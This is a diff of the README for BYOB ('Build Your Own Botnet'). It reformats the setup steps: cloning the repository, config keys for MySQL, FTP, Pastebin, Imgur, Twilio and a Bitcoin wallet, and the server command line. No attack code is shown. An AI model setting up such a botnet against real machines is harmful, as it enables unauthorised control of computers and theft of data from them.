@@ -1,19 +1,22 @@
 # BYOB (Build Your Own Botnet)  
+
 [![license](https://img.shields.io/github/license/mashape/apistatus.svg)](https://github.com/colental/byob/blob/master/LICENSE)
---------------------------------------------------
+
 ## Setup
+
 ### Installation
 `git clone https://github.com/colental/byob`
+
 ### Configuration
 Edit the [configuration](config.ini) file
 to add any API Keys or login credentials
 that you want to use for the following features:
-- `MySQL`: host, user, password
-- `FTP`: host, user, password
-- `Pastebin`:  api_dev_key
-- `Imgur`: imgur_api_key 
-- `Twilio`: account_sid, api_key, auth_token
-- `Bitcoin`: bitcoin_wallet_address
+- `mysql_host`, `mysql_user`, `mysql_password`
+- `ftp_host`, `ftp_user`, `ftp_password`
+- `twilio_account_sid`, `twilio_api_key`, `twilio_auth_token`
+- `pastebin_dev_key` 
+- `imgur_api_key` 
+- `bitcoin_wallet_address`
 
 ## Server
 `server.py <-p/--port PORT> [-c/--config CONFIG] [-h/--help] [-d/--debug]` 
